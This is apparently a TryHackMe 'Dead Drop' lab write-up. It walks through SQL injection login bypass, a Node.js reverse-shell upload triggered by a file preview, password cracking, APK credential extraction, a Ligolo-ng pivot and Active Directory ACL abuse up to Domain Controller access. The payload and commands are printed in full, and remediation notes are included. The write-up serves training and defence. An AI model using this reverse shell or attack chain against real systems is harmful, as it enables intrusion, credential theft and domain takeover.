# Dead Drop Challenge

*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Jr Pentester Challenges* | **Challenge:** *[Dead Drop](https://tryhackme.com/room/dead-drop)*

> [!IMPORTANT]
>
> **Spoiler warning:** This writeup contains part of the exploitation chain, however no flag codes are shown in this write-up!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> The following placeholders are used throughout this writeup:
>
>: `<TARGET_IP>` represents the IP address allocated to the target host when the room was started.
>: `<TUN0_IP>` represents the IP address allocated to my Kali Linux `tun0` interface while connected to the TryHackMe VPN.
>: `<REDACTED>` represents credentials, passwords, sensitive file contents, exact exploit values or anything else that would directly give away the challenge.
>: `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation, Active Directory and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of Dead Drop was to compromise a public-facing file-sharing application, use the web server as a pivot into an internal network, obtain access to a domain account and follow an Active Directory privilege escalation path to the Domain Controller.

The challenge required several weaknesses to be chained together. The initial web login was vulnerable to SQL injection, the authenticated file preview feature allowed server-side JavaScript execution, a backup disclosed a crackable Linux password hash, and an Android application contained hard-coded domain credentials.

After gaining access to the internal workstation, Active Directory enumeration identified an abusable permission over a privileged group. This relationship was used to gain administrative access to the Domain Controller and retrieve the final flag.

All challenge-specific credentials, account names, group names, permission names, hashes and flags have been redacted from this public writeup.

Confirmed lab details used during the walkthrough:

<p align="center">
  *[Image: Challenge_Network_Diagram]*
</p>

```text
DEADDROP-DC: 192.168.11.100
DEADDROP-WRK: 192.168.11.51
WebServer: 192.168.11.200
tun0 IP Address: <TUN0_IP>
Provisioned Hostname: deaddrop.thm
Attacker Working Directory: /tmp/VK
```

The target IP address was added to the local hosts file so the hostname resolved correctly from the Kali VM:

```bash
echo "192.168.11.200 deaddrop.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts deaddrop.thm
```

The VPN route and local tunnel interface were also checked:

```bash
ip route get 192.168.11.200
ip -br address show tun0
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe challenges. Many rooms rely on hostname-based routing, virtual hosts, redirects, cookies or application logic that will not behave correctly if the hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on.
>
> A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

The file can be reviewed using:

```bash
cat /etc/hosts
```

An old challenge entry can be removed with:

```bash
sudo sed -i '/deaddrop\.thm/d' /etc/hosts
```

The correct entry can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The following tools were used during the challenge:

* Nmap: TCP port and service enumeration.
* RustScan: Rapid port discovery with Nmap service detection.
* Gobuster: Web route and directory enumeration.
* Dirsearch: Additional web content discovery.
* Feroxbuster: Recursive route and file enumeration.
* cURL: HTTP request testing, authentication, cookie handling and file upload.
* Netcat: Reverse-shell listener.
* John the Ripper: Linux password hash cracking.
* SSH: Remote shell access to the web server.
* SCP: APK transfer from the web server to Kali.
* Apktool: Android APK decompilation.
* grep: Searching decompiled smali code.
* Ligolo-ng: Pivoting into the internal network.
* NetExec: SMB and WinRM authentication testing.
* Evil-WinRM: Interactive PowerShell access to the workstation.
* BloodHound Python: Active Directory data collection.
* jq: Direct inspection of BloodHound JSON output.
* bloodyAD: Active Directory group membership modification.
* smbclient: Accessing the Domain Controller administrative share.

## Initial Enumeration

### Port Scanning

A complete TCP scan was performed against the web server:

```bash
nmap -Pn -p- -sV --min-rate 2000 \
 -oN deaddrop-web-allports.txt \
 deaddrop.thm
```

The scan identified two exposed TCP services:

```text
22/tcp open  ssh
80/tcp open  http
```

RustScan was then used with Nmap default scripts and service detection:

```bash
rustscan -b 500 -a deaddrop.thm --top -- -sC -sV -Pn
```

The results identified:

```text
OpenSSH on port 22
Node.js Express on port 80
```

The HTTP service redirected requests to `/login` and presented the Dead Drop file-sharing application.

### Web Content Enumeration

Gobuster was used to enumerate application routes:

```bash
gobuster dir \
 -u http://deaddrop.thm/ \
 -w /usr/share/wordlists/dirb/big.txt
```

The useful routes were:

```text
/login
/dashboard
/logout
```

Unauthenticated access to `/dashboard` redirected back to `/login`.

Dirsearch and Feroxbuster were also used to confirm that there were no additional obvious unauthenticated routes.

```bash
dirsearch -u deaddrop.thm/
```

```bash
feroxbuster \
 -u http://deaddrop.thm/ \
 -w /usr/share/wordlists/dirb/big.txt \
 -x php,txt,html,py \
 -t 50 \
 -k \
 -C 404 \
 --redirects
```

### Inspecting the Login Form

The login page contained a standard POST form:

```html
<form method="POST" action="/login">
```

The submitted parameters were:

```text
username
password
```

A SQL injection payload was tested against the login request.

The exact payload has been redacted:

```text
Username: <REDACTED>
Password: <REDACTED>
```

The application accepted the request and returned a redirect to `/dashboard`.

The authenticated session was reproduced with cURL while saving the returned cookie:

```bash
curl -s \
 -c cookies.txt \
 -o /dev/null \
 -w 'HTTP %{http_code} -> %{redirect_url}\n' \
 -X POST http://deaddrop.thm/login \
 --data-urlencode "username=<REDACTED>" \
 --data-urlencode "password=<REDACTED>"
```

The response confirmed successful authentication:

```text
HTTP 302 -> http://deaddrop.thm/dashboard
```

The authenticated dashboard was then retrieved:

```bash
curl -s \
 -b cookies.txt \
 http://deaddrop.thm/dashboard \
 | tee dashboard.html
```

The dashboard exposed file upload, preview, rename and delete functionality.

## Exploits

### SQL Injection Authentication Bypass

The login endpoint was vulnerable to SQL injection.

The injected input altered the authentication query and allowed access without a valid password. This provided an authenticated application session and access to the file-management dashboard.

The important result was not simply the redirect. The saved cookie successfully loaded `/dashboard`, confirming that a valid authenticated session had been created.

### Identifying the Correct Upload Payload

The application was running on Node.js Express.

This meant that uploaded PHP files would not execute as PHP. Previewing a PHP file only returned its contents because no PHP interpreter was present.

The successful route involved uploading JavaScript and triggering it through the preview feature.

A Node.js reverse-shell payload was created:

```javascript
(function(){
  const net = require("net");
  const cp = require("child_process");
  const sh = cp.spawn("/bin/bash", []);
  const client = new net.Socket();

  client.connect(<REDACTED>, "<TUN0_IP>", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });

  return /a/;
})();
```

A Netcat listener was started on Kali:

```bash
nc -lvnp <REDACTED>
```

The JavaScript payload was uploaded with the authenticated cookie:

```bash
curl -s \
 -b cookies.txt \
 -F "file=@reverse.js" \
 -o /dev/null \
 -w "HTTP %{http_code}\n" \
 http://deaddrop.thm/upload
```

The upload returned:

```text
HTTP 302
```

The payload was then triggered by visiting the uploaded file through the preview route:

```text
http://deaddrop.thm/preview/reverse.js
```

The listener received a reverse shell from the web server.

The shell was running as the low-privileged Node.js service account:

```text
uid=<REDACTED>(node) gid=<REDACTED>(node)
```

### Discovering the Application Backup

The current working directory was identified:

```bash
pwd
```

The shell was located in:

```text
/opt/app
```

The application directory was reviewed:

```bash
ls -la
```

A backup directory was present.

The files inside it were enumerated:

```bash
find /opt/app/backup -maxdepth 2 -type f -ls
```

This revealed a backup containing a Linux shadow entry:

```text
/opt/app/backup/<REDACTED>
```

The file contained a SHA-512 crypt password hash for an SSH-capable account:

```text
<REDACTED>:$6$<REDACTED>:...
```

### Cracking the SSH Password

The shadow entry was copied into a local file on Kali:

```bash
echo '<REDACTED>' > shadow.hash
```

John the Ripper was used with `rockyou.txt`:

```bash
john \
 --wordlist=/usr/share/wordlists/rockyou.txt \
 shadow.hash
```

The cracked result was displayed:

```bash
john --show shadow.hash
```

The recovered credentials have been redacted:

```text
<REDACTED>:<REDACTED>
```

SSH access to the web server was then confirmed:

```bash
ssh <REDACTED>@deaddrop.thm
```

The remote session showed:

```text
whoami
<REDACTED>
```

### Recovering the Android Application

The SSH user's home directory was enumerated:

```bash
ls -la
```

A backup directory contained an Android application package:

```text
/home/<REDACTED>/backup/<REDACTED>.apk
```

The APK was copied to Kali:

```bash
scp \
 <REDACTED>@deaddrop.thm:/home/<REDACTED>/backup/<REDACTED>.apk \
 .
```

The file type was verified:

```bash
file <REDACTED>.apk
```

The result confirmed a valid Android package:

```text
Android package (APK), with APK Signing Block
```

### Decompiling the APK

The application was decompiled with Apktool:

```bash
apktool d \
 <REDACTED>.apk \
 -o deaddrop-mobile
```

The decompiled files were searched for likely authentication strings:

```bash
grep -RniE \
 'username|password|passwd|credential|login|api[_-]?key|token' \
 deaddrop-mobile \
 2>/dev/null \
 | head -n 50
```

Hard-coded credentials were discovered inside a smali configuration class.

The exact values have been redacted:

```text
DEFAULT_USERNAME = "<REDACTED>"
DEFAULT_PASSWORD = "<REDACTED>"
```

The credentials belonged to a domain user and became the entry point into the internal Windows environment.

### Establishing the Ligolo-ng Pivot

The web server had access to the internal network through its local interface.

The interface configuration was checked:

```bash
ip -br addr
```

Ligolo-ng was used to route selected internal hosts through the compromised web server.

On Kali, a TUN interface was created:

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```

The Ligolo proxy was started:

```bash
ligolo-proxy -selfcert
```

The WebUI was not required.

On the web server, the Ligolo agent connected back to Kali:

```bash
./agent \
 -connect <TUN0_IP>:<REDACTED> \
 -ignore-cert
```

The Ligolo console reported that the agent had joined.

The session was selected:

```text
session
```

The tunnel was started:

```text
start
```

Host-specific routes were then added from Kali:

```bash
sudo ip route add <TARGET_IP>/32 dev ligolo
```

Only `/32` routes were used.

Adding the full internal subnet through Ligolo would also redirect traffic intended for the pivot host. Because the web server was already reachable through the TryHackMe VPN, this could interrupt SSH access before the tunnel was fully established.

### Enumerating the Internal Workstation

A focused TCP scan was performed against the workstation:

```bash
nmap -Pn -sT \
 -p 88,135,139,389,445,5985 \
 <TARGET_IP>
```

The useful services included:

```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

The credentials recovered from the APK were tested against WinRM:

```bash
nxc winrm \
 <TARGET_IP> \
 -u '<REDACTED>' \
 -p '<REDACTED>'
```

Authentication succeeded:

```text
[+] <REDACTED>\<REDACTED>:<REDACTED> (Pwn3d!)
```

An interactive PowerShell session was opened:

```bash
evil-winrm \
 -i <TARGET_IP> \
 -u '<REDACTED>' \
 -p '<REDACTED>'
```

The session confirmed access to the internal workstation:

```text
whoami
<REDACTED>\<REDACTED>
```

### Identifying the Domain Controller

The domain controller was identified from the workstation:

```powershell
nltest /dsgetdc:<REDACTED>
```

The command returned the Domain Controller hostname and address:

```text
DC: \\<REDACTED>
Address: \\<TARGET_IP>
```

A separate `/32` route was added for the Domain Controller:

```bash
sudo ip route add <TARGET_IP>/32 dev ligolo
```

### Collecting BloodHound Data

BloodHound Python was used to collect Active Directory relationships and ACL data:

```bash
bloodhound-python \
 -u '<REDACTED>' \
 -p '<REDACTED>' \
 -d <REDACTED> \
 -ns <TARGET_IP> \
 -c All \
 --zip
```

The collection completed successfully and produced a ZIP archive.

The archive was extracted:

```bash
mkdir -p bloodhound-data

unzip -o \
 <REDACTED>_bloodhound.zip \
 -d bloodhound-data
```

The user's object SID was extracted from the BloodHound JSON:

```bash
jq -r \
 '.data[] |
 select(.Properties.name=="<REDACTED>") |
 .ObjectIdentifier' \
 bloodhound-data/*_users.json
```

The returned SID was then used to search every collected ACL where the domain user was the controlling principal:

```bash
jq -r \
 --arg sid '<REDACTED>' \
 '.data[] |
 . as $obj |
 .Aces[]? |
 select(.PrincipalSID==$sid) |
 "\($obj.Properties.name) -> \(.RightName)"' \
 bloodhound-data/*.json
```

The output revealed an abusable group membership permission over a privileged group.

The exact permission and group name have been redacted:

```text
<REDACTED> -> <REDACTED>
```

### Abusing the Active Directory Permission

The discovered ACL allowed the domain user to modify membership of a privileged group.

bloodyAD was used to add the compromised user to that group:

```bash
bloodyAD \
 --host <TARGET_IP> \
 -d <REDACTED> \
 -u '<REDACTED>' \
 -p '<REDACTED>' \
 add groupMember \
 '<REDACTED>' \
 '<REDACTED>'
```

The server confirmed the membership change:

```text
[+] <REDACTED> added to <REDACTED>
```

The target group was nested into a higher-privileged group, which resulted in Domain Admin-level access.

### Confirming Domain Controller Access

SMB authentication was tested against the Domain Controller:

```bash
nxc smb \
 <TARGET_IP> \
 -u '<REDACTED>' \
 -p '<REDACTED>'
```

The result confirmed administrative access:

```text
[+] <REDACTED>\<REDACTED>:<REDACTED> (Pwn3d!)
```

The available shares were enumerated:

```bash
nxc smb \
 <TARGET_IP> \
 -u '<REDACTED>' \
 -p '<REDACTED>' \
 --shares
```

The administrative shares included:

```text
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
```

### Retrieving the Final Flag

The final flag was read directly from the Administrator desktop through the `C$` share:

```bash
smbclient //<TARGET_IP>/C$ \
 -U '<REDACTED>/<REDACTED>%<REDACTED>' \
 -c 'get Users/Administrator/Desktop/flag.txt -'
```

The returned flag has been intentionally redacted:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. The attack began with hostname configuration and service enumeration.
The target address was mapped to `deaddrop.thm` in `/etc/hosts`. Nmap and RustScan identified SSH on port `22` and a Node.js Express application on port `80`.

### 2. Web enumeration revealed the login and dashboard routes.
Gobuster, Dirsearch and Feroxbuster confirmed the exposed application routes. Unauthenticated users were redirected to `/login`, while `/dashboard` required a valid session.

### 3. SQL injection bypassed the application login.
A crafted login request altered the backend query and created an authenticated application session. The resulting cookie provided access to the file upload and preview functionality.

### 4. The file preview feature executed uploaded JavaScript.
Because the application was built with Node.js, a JavaScript reverse shell was uploaded and triggered through the preview route. This provided a shell as the low-privileged Node.js service account.

### 5. A backup exposed a Linux password hash.
The `/opt/app/backup` directory contained a shadow backup. The recovered SHA-512 crypt hash was cracked with John the Ripper, providing valid SSH credentials for the web server.

### 6. An Android application exposed domain credentials.
The SSH user's backup directory contained an APK. Apktool decompiled the application, and a recursive search of the smali code revealed hard-coded domain credentials.

### 7. Ligolo-ng provided access to the internal network.
The compromised web server was used as a pivot host. A Ligolo-ng agent connected back to Kali, and host-specific `/32` routes were added for the internal workstation and Domain Controller.

### 8. The recovered domain credentials provided WinRM access.
The APK credentials authenticated successfully to the internal workstation over WinRM. Evil-WinRM provided an interactive PowerShell session as the domain user.

### 9. BloodHound data revealed an abusable Active Directory ACL.
BloodHound Python collected domain relationships and permissions. Direct `jq` analysis of the JSON showed that the compromised user could modify membership of a privileged group.

### 10. Group membership abuse resulted in Domain Admin access.
bloodyAD was used to add the compromised user to the affected group. Because that group was nested into a higher-privileged group, the user gained administrative access to the Domain Controller.

### 11. The final flag was retrieved through the administrative SMB share.
NetExec confirmed privileged SMB access. The `C$` share was then used to read the flag from the Administrator desktop.

## Key Lessons

This challenge demonstrated several common penetration testing and Active Directory security weaknesses:

- Hostname Configuration Matters: TryHackMe applications may depend on virtual-host routing or hostname-specific behaviour. Keeping `/etc/hosts` accurate and free from stale room entries prevents avoidable connection and routing problems.
- Technology Identification Changes the Exploit Path: The application was running on Node.js rather than PHP. Recognising the backend technology prevented wasted effort and led to a server-side JavaScript payload.
- File Preview Features Can Be More Dangerous Than Uploads: The upload itself did not immediately produce code execution. The vulnerable behaviour occurred when the application previewed and evaluated the uploaded JavaScript.
- Backup Files Must Be Treated as Sensitive: A backup copy of a shadow entry exposed a crackable credential. Backups often preserve secrets long after the live system has changed.
- Mobile Applications Cannot Safely Hide Static Credentials: APK files can be decompiled and searched. Hard-coded usernames and passwords should be considered recoverable by anyone who obtains the application.
- Low-Privilege Access Can Reveal the Next Stage: The initial Node.js shell was limited, but it exposed the backup needed for SSH access. SSH access then exposed the APK required for internal authentication.
- Pivot Routes Must Be Added Carefully: Routing an entire subnet through Ligolo-ng can unintentionally redirect traffic to the pivot host itself. Host-specific `/32` routes reduce the chance of breaking an existing SSH connection.
- Active Directory Compromise Often Depends on Relationships: The domain user was not initially an administrator. The decisive weakness was an ACL relationship over a privileged group rather than a conventional local privilege escalation.
- Nested Group Membership Can Hide Effective Privilege: A group may appear ordinary when viewed alone but inherit powerful access through nesting. Effective permissions must be reviewed across the complete membership chain.
- Validate Each Stage Before Moving Forward: Successful authentication, tunnel creation, group modification and Domain Controller access were each confirmed independently. This made troubleshooting far easier when the route configuration briefly interrupted SSH access.

## Remediation Notes

The weaknesses demonstrated in this lab could be mitigated by:

- Using prepared statements and parameterised queries for every database operation.
- Applying server-side validation to all authentication input.
- Storing uploaded files outside executable application paths.
- Preventing uploaded JavaScript or other active content from being evaluated by preview functions.
- Restricting backup files with least-privilege permissions.
- Removing shadow data and credentials from application backup directories.
- Enforcing long, random and unique service account passwords.
- Avoiding reusable credentials inside mobile applications.
- Issuing short-lived tokens from a backend service instead of embedding passwords in APK files.
- Restricting WinRM and SMB to approved management hosts.
- Applying network segmentation between DMZ systems and internal workstations.
- Auditing Active Directory ACLs for abusable group membership and object-control permissions.
- Reviewing nested privileged group membership regularly.
- Monitoring unexpected group membership changes.
- Alerting on unusual LDAP enumeration and BloodHound-style collection activity.
- Limiting administrative share access to authorised management accounts and systems.

## Disclaimer

This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
